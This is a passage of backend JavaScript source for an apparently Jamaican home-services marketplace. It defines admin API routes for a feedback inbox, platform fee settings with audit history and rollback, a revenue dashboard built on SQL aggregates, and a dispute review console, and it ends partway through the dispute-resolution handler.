// Admin Feedback Inbox
// Reads/writes public.feedback_submissions. The public form only ever sends
// role in {client, provider, visitor, other} and never collects a subject.
// ============================================================

const FEEDBACK_ROLE_MAP = { client: 'client', provider: 'provider', visitor: 'visitor' };
const toFeedbackRole = (r) => FEEDBACK_ROLE_MAP[r] || 'other';

const shapeFeedbackItem = (r) => ({
  id: r.id,
  cat: r.cat,
  name: r.name,
  email: r.email,
  role: toFeedbackRole(r.role),
  parish: r.parish || null,
  msg: r.message,
  rating: r.rating,
  followUp: r.follow_up,
  date: r.created_at.toISOString().slice(0, 10),
  status: r.status,
  approvedForDisplay: r.approved_for_display === true,
});

// GET /api/admin/feedback-submissions
router.get('/feedback-submissions', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT id, cat, name, email, role, parish, rating, follow_up, message, status, created_at, approved_for_display
      FROM public.feedback_submissions
      ORDER BY created_at DESC
    `);
    res.json({ success: true, items: r.rows.map(shapeFeedbackItem) });
  } catch (err) {
    console.error('GET /api/admin/feedback-submissions error:', err);
    res.status(500).json({ success: false, message: 'Failed to load feedback submissions.' });
  }
});

// PATCH /api/admin/feedback-submissions/:id/status   body: { status }
router.patch('/feedback-submissions/:id/status', async (req, res) => {
  const { status } = req.body || {};
  if (!INBOX_STATUSES.includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status.' });
  }
  try {
    const r = await db.query(
      `UPDATE public.feedback_submissions SET status = $2 WHERE id = $1 RETURNING id`,
      [req.params.id, status]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Submission not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('PATCH /api/admin/feedback-submissions/:id/status error:', err);
    res.status(500).json({ success: false, message: 'Failed to update status.' });
  }
});

// PATCH /api/admin/feedback-submissions/:id/approve-display   body: { approved: boolean }
// Gates whether a 'feedback'-category submission can appear as a public
// homepage testimonial (GET /api/feedback/public/testimonials) — off by
// default so nothing goes live without an admin reviewing it first.
router.patch('/feedback-submissions/:id/approve-display', async (req, res) => {
  const { approved } = req.body || {};
  if (typeof approved !== 'boolean') {
    return res.status(400).json({ success: false, message: 'approved must be a boolean.' });
  }
  try {
    const r = await db.query(
      `UPDATE public.feedback_submissions SET approved_for_display = $2 WHERE id = $1 RETURNING id`,
      [req.params.id, approved]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Submission not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('PATCH /api/admin/feedback-submissions/:id/approve-display error:', err);
    res.status(500).json({ success: false, message: 'Failed to update display approval.' });
  }
});

// ============================================================
// Platform Fee Configuration (admin-only)
// Reads/writes platform_fee_config (singleton) + fee_change_history (audit).
// Every change broadcasts on 'platform-fees' so the whole app updates live.
// ============================================================

const num = (v) => (v == null ? null : parseFloat(v));

// Map a DB history row to the admin-screen HistoryEntry shape.
const shapeFeeHistory = (h) => {
  const created = new Date(h.created_at);
  return {
    id:           h.code,
    date:         created.toISOString().slice(0, 10),
    time:         created.toISOString().slice(11, 16),
    by:           h.changed_by_name || 'TendrIt Admin',
    role:         'Platform Owner',
    type:         h.type,
    old_client:   num(h.old_client),
    old_provider: num(h.old_provider),
    new_client:   num(h.new_client),
    new_provider: num(h.new_provider),
    effective:    h.effective ? new Date(h.effective).toISOString().slice(0, 10) : null,
    reason:       h.reason || '',
    status:       h.status,
    batches_applied: 0,
  };
};

async function loadFeeConfig() {
  const [cfg, hist] = await Promise.all([
    db.query('SELECT * FROM public.platform_fee_config WHERE id = 1'),
    db.query(`
      SELECT h.*, (u.first_name || ' ' || u.last_name) AS changed_by_name
      FROM public.fee_change_history h
      LEFT JOIN public.users u ON u.id = h.changed_by
      ORDER BY h.created_at ASC
    `),
  ]);
  const c = cfg.rows[0] || {};
  const day = (v) => (v ? new Date(v).toISOString().slice(0, 10) : null);
  return {
    config: {
      client_rate:   num(c.client_rate),
      provider_rate: num(c.provider_rate),
      client_effective:   day(c.client_effective),
      provider_effective: day(c.provider_effective),
      // Scheduled (pending) changes not yet in effect — null when none.
      pending_client_rate:        num(c.pending_client_rate),
      pending_client_effective:   day(c.pending_client_effective),
      pending_provider_rate:      num(c.pending_provider_rate),
      pending_provider_effective: day(c.pending_provider_effective),
      // Minimum-fee floor (cents) + toggle — managed in Advanced settings.
      min_fee_enabled:  c.min_fee_enabled !== false,
      min_client_fee:   c.min_client_fee != null ? parseInt(c.min_client_fee, 10) : 10000,
      min_provider_fee: c.min_provider_fee != null ? parseInt(c.min_provider_fee, 10) : 10000,
    },
    history: hist.rows.map(shapeFeeHistory),
  };
}

const broadcastFees = (config) =>
  notifyChannel('platform-fees', 'fees-updated', {
    clientRate: config.client_rate,
    providerRate: config.provider_rate,
  }).catch(() => {});

// GET /api/admin/fee-config — current config + full change history.
router.get('/fee-config', async (req, res) => {
  try {
    res.json({ success: true, ...(await loadFeeConfig()) });
  } catch (err) {
    console.error('GET /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to load fee config.' });
  }
});

// PATCH /api/admin/fee-config { side, rate, effective, reason } — change one side.
router.patch('/fee-config', async (req, res) => {
  const { side, rate, effective, reason } = req.body || {};
  if (side !== 'client' && side !== 'provider') {
    return res.status(400).json({ success: false, message: 'side must be "client" or "provider".' });
  }
  const r = parseFloat(rate);
  if (isNaN(r) || r < 0 || r > 100) {
    return res.status(400).json({ success: false, message: 'Rate must be between 0 and 100.' });
  }
  if (!reason || !reason.trim()) {
    return res.status(400).json({ success: false, message: 'A reason is required.' });
  }
  if (!effective) {
    return res.status(400).json({ success: false, message: 'An effective date is required.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    const newClient = side === 'client' ? r : oldClient;
    const newProvider = side === 'provider' ? r : oldProvider;

    // A change effective TODAY or earlier (Jamaica) applies now; a FUTURE date
    // is parked in the pending slot and activated by the daily job on its date.
    // (side is validated to a fixed literal above — safe to interpolate.)
    const applyNow = String(effective) <= jamaicaToday();
    if (applyNow) {
      await db.query(
        `UPDATE public.platform_fee_config
            SET ${side}_rate = $1, ${side}_effective = $2,
                pending_${side}_rate = NULL, pending_${side}_effective = NULL,
                updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    } else {
      await db.query(
        `UPDATE public.platform_fee_config
            SET pending_${side}_rate = $1, pending_${side}_effective = $2, updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    }
    await db.query(
      `UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`,
      [side]
    );
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, $6, $7, $8, 'active')`,
      [side, oldClient, oldProvider, newClient, newProvider, effective, reason.trim(), req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out, scheduled: !applyNow });
    // Only broadcast a live rate change when it actually took effect now.
    if (applyNow) broadcastFees(out.config);
  } catch (err) {
    console.error('PATCH /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to update fee config.' });
  }
});

// POST /api/admin/fee-config/rollback { client, provider } — revert the checked
// side(s) to their previous historical value. Entries are individual per side.
router.post('/fee-config/rollback', async (req, res) => {
  const doClient = !!(req.body && req.body.client);
  const doProvider = !!(req.body && req.body.provider);
  if (!doClient && !doProvider) {
    return res.status(400).json({ success: false, message: 'Select at least one side to roll back.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    let newClient = oldClient;
    let newProvider = oldProvider;

    if (doClient) {
      const prev = (await db.query(
        `SELECT old_client FROM public.fee_change_history WHERE type IN ('client','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous client fee to roll back to.' });
      newClient = num(prev.old_client);
    }
    if (doProvider) {
      const prev = (await db.query(
        `SELECT old_provider FROM public.fee_change_history WHERE type IN ('provider','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous provider fee to roll back to.' });
      newProvider = num(prev.old_provider);
    }

    if (doClient) {
      await db.query(`UPDATE public.platform_fee_config SET client_rate = $1, client_effective = CURRENT_DATE, pending_client_rate = NULL, pending_client_effective = NULL, updated_at = NOW() WHERE id = 1`, [newClient]);
    }
    if (doProvider) {
      await db.query(`UPDATE public.platform_fee_config SET provider_rate = $1, provider_effective = CURRENT_DATE, pending_provider_rate = NULL, pending_provider_effective = NULL, updated_at = NOW() WHERE id = 1`, [newProvider]);
    }

    // Supersede the active entries for the rolled-back side(s).
    if (doClient && doProvider) {
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active'`);
    } else {
      const side = doClient ? 'client' : 'provider';
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`, [side]);
    }

    const type = doClient && doProvider ? 'both' : doClient ? 'client' : 'provider';
    const sidesLabel = [doClient && 'Client', doProvider && 'Provider'].filter(Boolean).join(' & ');
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, CURRENT_DATE, $6, $7, 'active')`,
      [type, oldClient, oldProvider, newClient, newProvider, `Rollback (${sidesLabel})`, req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    broadcastFees(out.config);
  } catch (err) {
    console.error('POST /api/admin/fee-config/rollback error:', err);
    res.status(500).json({ success: false, message: 'Failed to roll back fee config.' });
  }
});

// PATCH /api/admin/fee-config/minimums { enabled, minClientFee, minProviderFee }
// Persist the minimum-fee floor (Advanced settings). Amounts are JMD cents.
router.patch('/fee-config/minimums', async (req, res) => {
  const { enabled, minClientFee, minProviderFee } = req.body || {};
  const cents = (v) => {
    const n = Math.round(Number(v));
    return Number.isFinite(n) && n >= 0 ? n : null;
  };
  const mc = cents(minClientFee);
  const mp = cents(minProviderFee);
  if (mc === null || mp === null) {
    return res.status(400).json({ success: false, message: 'Minimum fees must be non-negative amounts.' });
  }
  try {
    await db.query(
      `UPDATE public.platform_fee_config
         SET min_fee_enabled = $1, min_client_fee = $2, min_provider_fee = $3, updated_at = NOW()
       WHERE id = 1`,
      [enabled !== false, mc, mp]
    );
    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    // Nudge open clients to refresh fee data (incl. the new minimums via /api/fees).
    notifyChannel('platform-fees', 'fees-updated', {});
  } catch (err) {
    console.error('PATCH /api/admin/fee-config/minimums error:', err);
    res.status(500).json({ success: false, message: 'Failed to update minimum fees.' });
  }
});

// ============================================================
// GET /api/admin/revenue?period=30d
// Real platform-overview data for the admin Dashboard, from
// public.transactions/tenders/quotes/users/provider_profiles. Returns the
// full set of fields the dashboard's revenue, activity, growth, category,
// funnel, and urgency widgets need — no mock data left once this responds.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md.
// ============================================================
const REVENUE_WINDOWS = { '7d': 7, '30d': 30, '90d': 90, '1y': 365, all: null };

const compactMoney = (cents) => {
  const d = Math.round((cents || 0) / 100);
  if (d >= 1e6) return (d / 1e6).toFixed(2).replace(/\.?0+$/, '') + 'M';
  if (d >= 1e3) return Math.round(d / 1e3) + 'K';
  return d.toLocaleString('en-US');
};
const fullMoney = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');

// Formats a duration in seconds as "Xh" (<48h) or "X.Yd" otherwise — matches
// the dashboard's existing "16h"/"18h" style for realistic accept times.
const fmtDuration = (seconds) => {
  if (seconds == null || !Number.isFinite(Number(seconds))) return '—';
  const hours = Number(seconds) / 3600;
  if (hours < 48) return Math.max(0, Math.round(hours)) + 'h';
  return (hours / 24).toFixed(1) + 'd';
};

const CATEGORY_COLORS = ['var(--sage-mid)', 'var(--blue)', 'var(--amber)', 'var(--purple)', '#34d399', '#f87171'];
const CATEGORY_OTHER_COLOR = '#475569';

const FUNNEL_COLORS = { posted: '#4ade80', quoted: '#22c55e', accepted: '#fbbf24', paid: '#60a5fa', completed: '#a78bfa' };

const URGENCY_LABELS = { emergency: 'Emergency', urgent: 'Urgent', soon: 'Soon', flexible: 'Flexible', planning: 'Planning ahead' };
const URGENCY_COLORS = { emergency: '#f87171', urgent: '#fb923c', soon: '#fbbf24', flexible: '#60a5fa', planning: '#a78bfa' };
const URGENCY_ORDER = ['emergency', 'urgent', 'soon', 'flexible', 'planning'];

router.get('/revenue', async (req, res) => {
  const period = REVENUE_WINDOWS.hasOwnProperty(req.query.period) ? req.query.period : '30d';
  const days = REVENUE_WINDOWS[period]; // null = all-time
  const windowCond = `($1::int IS NULL OR created_at >= NOW() - (INTERVAL '1 day' * $1))`;
  try {
    const sums = `
      SELECT COALESCE(SUM(amount),0)::bigint       AS gmv,
             COALESCE(SUM(client_fee),0)::bigint   AS cfee,
             COALESCE(SUM(provider_fee),0)::bigint AS pfee,
             COALESCE(SUM(platform_fee),0)::bigint AS rev,
             COUNT(*)::int                          AS done
      FROM public.transactions
      -- A row exists from the moment checkout is INITIATED, not just once
      -- paid — exclude unpaid/abandoned attempts from platform revenue.
      WHERE status NOT IN ('awaiting_payment', 'payment_failed')`;

    // Consolidated into 6 queries (down from 18) using FILTER(WHERE ...) for
    // current/previous-window pairs and json_agg subqueries for the two
    // GROUP BY breakdowns — each one firing 16-18 queries in parallel was
    // exhausting the connection pool (max: 10) and causing intermittent
    // ETIMEDOUTs under load, which made the whole endpoint fail and silently
    // fall back to stale mock data on the frontend.
    const [revRes, tenderRes, quoteRes, userRes, totalsRes, aggRes] = await Promise.all([
      db.query(`
        SELECT
          COALESCE(SUM(amount)       FILTER (WHERE ${windowCond}), 0)::bigint AS gmv,
          COALESCE(SUM(client_fee)   FILTER (WHERE ${windowCond}), 0)::bigint AS cfee,
          COALESCE(SUM(provider_fee) FILTER (WHERE ${windowCond}), 0)::bigint AS pfee,
          COALESCE(SUM(platform_fee) FILTER (WHERE ${windowCond}), 0)::bigint AS rev,
          COUNT(*)                    FILTER (WHERE ${windowCond})::int AS done,
          COALESCE(SUM(platform_fee) FILTER (WHERE $1::int IS NOT NULL AND created_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND created_at < NOW() - (INTERVAL '1 day' * $1)), 0)::bigint AS prev_rev,
          COUNT(*)                    FILTER (WHERE $1::int IS NOT NULL AND created_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND created_at < NOW() - (INTERVAL '1 day' * $1))::int AS prev_done
        FROM public.transactions
        WHERE status NOT IN ('awaiting_payment', 'payment_failed')
      `, [days]),
      db.query(`
        SELECT
          COUNT(*) FILTER (WHERE ${windowCond})::int AS jobs,
          COUNT(*) FILTER (WHERE $1::int IS NOT NULL AND created_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND created_at < NOW() - (INTERVAL '1 day' * $1))::int AS prev_jobs,
          COUNT(*) FILTER (WHERE quotes_count > 0 AND (${windowCond}))::int AS quoted_count,
          COUNT(*) FILTER (WHERE status = 'completed' AND (${windowCond}))::int AS completed_count,
          COUNT(*) FILTER (
            WHERE (${windowCond})
              AND EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = tenders.id AND q.status = 'accepted')
          )::int AS accepted_count,
          COUNT(*) FILTER (
            WHERE (${windowCond})
              AND EXISTS (SELECT 1 FROM public.transactions tx WHERE tx.tender_id = tenders.id AND tx.status NOT IN ('awaiting_payment','payment_failed'))
          )::int AS paid_count
        FROM public.tenders
        WHERE trashed_at IS NULL
      `, [days]),
      db.query(`
        SELECT
          COUNT(*) FILTER (WHERE $1::int IS NULL OR q.created_at >= NOW() - (INTERVAL '1 day' * $1))::int AS quotes_cur,
          COUNT(*) FILTER (WHERE $1::int IS NOT NULL AND q.created_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND q.created_at < NOW() - (INTERVAL '1 day' * $1))::int AS quotes_prev,
          AVG(EXTRACT(EPOCH FROM (q.updated_at - t.created_at))) FILTER (
            WHERE q.status = 'accepted' AND ($1::int IS NULL OR q.updated_at >= NOW() - (INTERVAL '1 day' * $1))
          )::float AS accept_seconds_cur,
          AVG(EXTRACT(EPOCH FROM (q.updated_at - t.created_at))) FILTER (
            WHERE q.status = 'accepted' AND $1::int IS NOT NULL AND q.updated_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND q.updated_at < NOW() - (INTERVAL '1 day' * $1)
          )::float AS accept_seconds_prev
        FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id
        WHERE t.trashed_at IS NULL
      `, [days]),
      db.query(`
        SELECT role,
          COUNT(*) FILTER (WHERE ${windowCond})::int AS n_cur,
          COUNT(*) FILTER (WHERE $1::int IS NOT NULL AND created_at >= NOW() - (INTERVAL '1 day' * $1 * 2) AND created_at < NOW() - (INTERVAL '1 day' * $1))::int AS n_prev
        FROM public.users
        WHERE role IN ('homeowner','provider')
        GROUP BY role
      `, [days]),
      db.query(`
        SELECT
          (SELECT COUNT(*) FROM public.users WHERE role = 'homeowner')::int AS total_clients,
          (SELECT COUNT(*) FROM public.users WHERE role = 'provider')::int AS total_providers,
          (SELECT COUNT(*) FROM public.provider_profiles WHERE is_onboarding_complete = TRUE AND verification_status = 'approved')::int AS verified_providers,
          (SELECT COUNT(*) FROM public.provider_profiles WHERE is_onboarding_complete = TRUE AND verification_status = 'pending')::int AS pending_verification
      `),
      db.query(`
        SELECT
          (SELECT json_agg(x) FROM (
            SELECT urgency, COUNT(*)::int AS n
            FROM public.tenders
            WHERE trashed_at IS NULL AND (${windowCond})
            GROUP BY urgency
          ) x) AS urgency_json,
          (SELECT json_agg(x) FROM (
            SELECT COALESCE(st.display_name, t.category::text) AS name, COUNT(*)::int AS n
            FROM public.tenders t LEFT JOIN public.service_types st ON st.id = t.service_type_id
            WHERE t.trashed_at IS NULL AND ($1::int IS NULL OR t.created_at >= NOW() - (INTERVAL '1 day' * $1))
            GROUP BY 1 ORDER BY n DESC
          ) x) AS categories_json,
          (
            SELECT AVG(EXTRACT(EPOCH FROM (fq.first_at - t2.created_at)))::float
            FROM public.tenders t2
            JOIN LATERAL (SELECT MIN(created_at) AS first_at FROM public.quotes WHERE tender_id = t2.id) fq ON fq.first_at IS NOT NULL
            WHERE t2.urgency = 'emergency' AND t2.trashed_at IS NULL AND ($1::int IS NULL OR t2.created_at >= NOW() - (INTERVAL '1 day' * $1))
          ) AS emergency_first_seconds
      `, [days]),
    ]);

    const c = revRes.rows[0];
    const tr = tenderRes.rows[0];
    const qr = quoteRes.rows[0];
    const agg = aggRes.rows[0];

    // Delta vs the immediately preceding window of equal length (skip for all-time).
    let deltaRev = '—';
    if (days !== null) {
      const prevRev = Number(c.prev_rev);
      const curRev = Number(c.rev);
      if (prevRev > 0) {
        const pct = ((curRev - prevRev) / prevRev) * 100;
        deltaRev = `${pct >= 0 ? '↑' : '↓'} ${Math.abs(pct).toFixed(1)}%`;
      } else if (curRev > 0) {
        deltaRev = '↑ new';
      }
    }

    const done = c.done || 0;
    const jobs = tr.jobs || 0;
    const quotes = qr.quotes_cur || 0;

    // Period-over-period % change — same "vs previous window of equal
    // length" logic as deltaRev above, for the three Activity KPI cards.
    const pctDelta = (curVal, prevVal) => {
      if (days === null) return '—';
      if (prevVal > 0) {
        const pct = ((curVal - prevVal) / prevVal) * 100;
        return `${pct >= 0 ? '↑' : '↓'} ${Math.abs(pct).toFixed(1)}%`;
      }
      return curVal > 0 ? '↑ new' : '—';
    };
    const deltaJobs = pctDelta(jobs, tr.prev_jobs || 0);
    const deltaQuotes = pctDelta(quotes, qr.quotes_prev || 0);
    const deltaDone = pctDelta(done, c.prev_done || 0);

    const acceptSeconds = qr.accept_seconds_cur;
    let deltaTime = '—';
    const prevAcceptSeconds = qr.accept_seconds_prev;
    if (acceptSeconds != null && prevAcceptSeconds != null) {
      const diffHours = (prevAcceptSeconds - acceptSeconds) / 3600;
      if (Math.abs(diffHours) >= 0.05) {
        deltaTime = diffHours >= 0
          ? `↓ ${diffHours.toFixed(1)}h faster`
          : `↑ ${Math.abs(diffHours).toFixed(1)}h slower`;
      }
    }

    const newClients = userRes.rows.find((r) => r.role === 'homeowner')?.n_cur || 0;
    const newProvs = userRes.rows.find((r) => r.role === 'provider')?.n_cur || 0;
    const prevNewClients = userRes.rows.find((r) => r.role === 'homeowner')?.n_prev || 0;
    const prevNewProvs = userRes.rows.find((r) => r.role === 'provider')?.n_prev || 0;
    const deltaNewClients = pctDelta(newClients, prevNewClients);
    const deltaNewProvs = pctDelta(newProvs, prevNewProvs);

    const t = totalsRes.rows[0];
    const verifiedPct = t.total_providers ? Math.round((t.verified_providers / t.total_providers) * 100) : 0;

    // Top 5 categories by job count; the rest collapse into "Other" (mirrors
    // the dashboard's original fixed-7-row layout).
    const catRows = agg.categories_json || [];
    const topCats = catRows.slice(0, 5);
    const otherCount = catRows.slice(5).reduce((sum, r) => sum + r.n, 0);
    const categories = topCats.map((r, i) => ({
      name: r.name, val: r.n,
      pct: jobs ? Math.round((r.n / jobs) * 100) : 0,
      color: CATEGORY_COLORS[i % CATEGORY_COLORS.length],
    }));
    if (otherCount > 0) {
      categories.push({ name: 'Other', val: otherCount, pct: jobs ? Math.round((otherCount / jobs) * 100) : 0, color: CATEGORY_OTHER_COLOR });
    }

    const quotedCount = tr.quoted_count || 0;
    const acceptedCount = tr.accepted_count || 0;
    const paidCount = tr.paid_count || 0;
    const completedCount = tr.completed_count || 0;
    const pctOf = (n) => (jobs ? Math.round((n / jobs) * 100) : 0);
    const funnel = [
      { label: 'Jobs posted', n: jobs, pct: 100, color: FUNNEL_COLORS.posted },
      { label: 'Quotes received', n: quotedCount, pct: pctOf(quotedCount), color: FUNNEL_COLORS.quoted },
      { label: 'Quotes accepted', n: acceptedCount, pct: pctOf(acceptedCount), color: FUNNEL_COLORS.accepted },
      { label: 'Payment received', n: paidCount, pct: pctOf(paidCount), color: FUNNEL_COLORS.paid },
      { label: 'Job completed', n: completedCount, pct: pctOf(completedCount), color: FUNNEL_COLORS.completed },
    ];

    const urgencyRows = agg.urgency_json || [];
    const urgencyCounts = Object.fromEntries(urgencyRows.map((r) => [r.urgency, r.n]));
    const urgencyTotal = urgencyRows.reduce((sum, r) => sum + r.n, 0);
    const urgency = URGENCY_ORDER
      .filter((key) => urgencyCounts[key])
      .map((key) => ({
        label: URGENCY_LABELS[key], count: urgencyCounts[key],
        pct: urgencyTotal ? Math.round((urgencyCounts[key] / urgencyTotal) * 100) : 0,
        color: URGENCY_COLORS[key],
      }));
    const timeSensitivePct = urgencyTotal
      ? Math.round(((urgencyCounts.emergency || 0) + (urgencyCounts.urgent || 0)) / urgencyTotal * 100)
      : 0;
    const emergencyFirstQuoteSeconds = agg.emergency_first_seconds;
    const urgencyNote = urgencyTotal
      ? `${timeSensitivePct}% time-sensitive` + (emergencyFirstQuoteSeconds != null
          ? ` · avg ${fmtDuration(emergencyFirstQuoteSeconds)} to first Emergency quote`
          : '')
      : 'No tenders in this period yet.';

    const cfeeNum = Number(c.cfee), pfeeNum = Number(c.pfee);
    const feeTotal = cfeeNum + pfeeNum;
    const clientPct = feeTotal ? Math.round((cfeeNum / feeTotal) * 100) : 50;

    res.json({
      success: true,
      revenue: {
        rev: compactMoney(c.rev),
        cfee: compactMoney(c.cfee),
        pfee: compactMoney(c.pfee),
        gmv: compactMoney(c.gmv),
        done,
        delta_rev: deltaRev,
        fee_clients: fullMoney(c.cfee),
        fee_provs: fullMoney(c.pfee),
        fee_per_job: done ? 'J$' + fullMoney(Number(c.rev) / done) : 'J$0',
        avg_gmv: done ? 'J$' + fullMoney(Number(c.gmv) / done) : 'J$0',
        jobs,
        quotes,
        accept_time: fmtDuration(acceptSeconds),
        delta_time: deltaTime,
        delta_jobs: deltaJobs,
        delta_quotes: deltaQuotes,
        delta_done: deltaDone,
        new_clients: newClients,
        new_provs: newProvs,
        delta_new_clients: deltaNewClients,
        delta_new_provs: deltaNewProvs,
        avgQuotesPerJob: jobs ? (quotes / jobs).toFixed(1) : '0.0',
        totalClients: t.total_clients,
        totalProviders: t.total_providers,
        verifiedProviders: t.verified_providers,
        verifiedProvidersPct: verifiedPct,
        pendingVerification: t.pending_verification,
        categories,
        funnel,
        urgency,
        urgencyNote,
        clientPct,
        providerPct: 100 - clientPct,
      },
    });
  } catch (err) {
    console.error('GET /api/admin/revenue error:', err);
    res.status(500).json({ success: false, message: 'Failed to load revenue.' });
  }
});

// ============================================================
// Disputes — admin review & resolution console.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md ("Disputes").
// ============================================================

// How admins can resolve a dispute → the escrow status we record. WiPay
// refunds are deferred — no refund API call exists anywhere in this codebase
// yet — so the client's actual refund never moves automatically; the
// disputes/transactions rows are just the authoritative record of what's owed.
// Only two real outcomes (per 2026-10 clarification with the client): either
// the provider is found to have completed the job (full release, same as a
// normal payout) or the client is found to be right (full refund of the job
// amount + half the client's platform fee back; TendrIt keeps the other half
// as a service charge). There is no partial-provider-payout outcome — a
// provider is only ever paid if completion was actually signaled by both
// parties, so a disputed job always resolves to either $0 or 100% for them.
const RESOLUTION_TX_STATUS = {
  refund: 'refunded',   // client made whole (job + half fee); provider gets $0
  release: 'completed', // provider paid out in full
};

// GET /api/admin/disputes
// Every dispute with its transaction, tender, service, parish, both parties,
// the two-sided fee breakdown, and a signed URL for the evidence photo.
router.get('/disputes', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        d.id,
        d.category,
        d.description,
        d.image_path,
        d.status,
        d.resolution,
        d.resolution_notes,
        d.created_at,
        d.resolved_at,
        d.client_id,
        d.provider_id,
        tx.quote_id,
        t.display_code,
        t.parish,
        t.created_at                         AS tender_created_at,
        st.display_name                      AS service_name,
        cu.first_name                        AS client_first_name,
        cu.last_name                         AS client_last_name,
        pu.first_name                        AS provider_first_name,
        pu.last_name                         AS provider_last_name,
        ru.first_name                        AS resolver_first_name,
        ru.last_name                         AS resolver_last_name,
        tx.amount,
        tx.client_fee,
        tx.provider_fee,
        tx.platform_fee,
        tx.provider_payout,
        tx.status                            AS transaction_status,
        tx.created_at                        AS accepted_at,
        tx.provider_completed_at,
        tx.wipay_order_id,
        tx.wipay_transaction_id
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      LEFT JOIN public.users ru   ON ru.id = d.resolved_by
      ORDER BY (d.status = 'open') DESC, d.created_at DESC
    `);

    // The 1:1 chat is scoped to the quote (transactions.quote_id → messages).
    // Admins may read all messages (messages_select_admin RLS) for dispute
    // resolution. Fetch every relevant conversation in one query and group by
    // quote so we can attach a transcript to each dispute.
    const quoteIds = [...new Set(result.rows.map((r) => r.quote_id).filter(Boolean))];
    const chatByQuote = new Map();
    if (quoteIds.length) {
      const msgs = await db.query(
        `SELECT quote_id, sender_id, body, created_at
           FROM public.messages
          WHERE quote_id = ANY($1::uuid[])
          ORDER BY created_at ASC`,
        [quoteIds]
      );
      for (const m of msgs.rows) {
        if (!chatByQuote.has(m.quote_id)) chatByQuote.set(m.quote_id, []);
        chatByQuote.get(m.quote_id).push(m);
      }
    }

    // Sign evidence photos (private tender-media bucket).
    const disputes = await Promise.all(
      result.rows.map(async (r) => ({
        id: r.id,
        displayCode: r.display_code,
        job: r.service_name || 'Service job',
        category: r.category,
        parish: r.parish,
        description: r.description,
        evidenceUrl: await signedUrl(supabase, 'tender-media', r.image_path),
        chat: (chatByQuote.get(r.quote_id) || []).map((m) => ({
          role: m.sender_id === r.client_id ? 'client' : m.sender_id === r.provider_id ? 'provider' : 'system',
          body: m.body,
          createdAt: m.created_at,
        })),
        status: r.status,
        resolution: r.resolution,
        resolutionNotes: r.resolution_notes,
        client: { firstName: r.client_first_name, lastName: r.client_last_name },
        provider: { firstName: r.provider_first_name, lastName: r.provider_last_name },
        resolver:
          r.resolver_first_name || r.resolver_last_name
            ? { firstName: r.resolver_first_name, lastName: r.resolver_last_name }
            : null,
        amount: r.amount,
        clientFee: r.client_fee,
        providerFee: r.provider_fee,
        platformFee: r.platform_fee,
        providerPayout: r.provider_payout,
        transactionStatus: r.transaction_status,
        tenderCreatedAt: r.tender_created_at,
        acceptedAt: r.accepted_at,
        providerCompletedAt: r.provider_completed_at,
        wipayOrderId: r.wipay_order_id,
        wipayTransactionId: r.wipay_transaction_id,
        createdAt: r.created_at,
        resolvedAt: r.resolved_at,
      }))
    );

    // Dispute rate needs the denominator: total accepted (transacted) jobs.
    const totals = await db.query(
      `SELECT COUNT(*)::int AS transacted FROM public.transactions
        WHERE status NOT IN ('awaiting_payment', 'payment_failed')`
    );

    res.json({
      success: true,
      disputes,
      stats: { transactedJobs: totals.rows[0].transacted },
    });
  } catch (err) {
    console.error('GET /api/admin/disputes error:', err);
    res.status(500).json({ success: false, message: 'Failed to load disputes.' });
  }
});

// POST /api/admin/disputes/:id/resolve   { resolution, notes? }
// Resolve an open dispute: record the outcome + note + resolver, advance the
// escrow status, and notify both parties (email + realtime + bell).
router.post('/disputes/:id/resolve', async (req, res) => {
  const { id } = req.params;
  const resolution = typeof req.body.resolution === 'string' ? req.body.resolution : '';
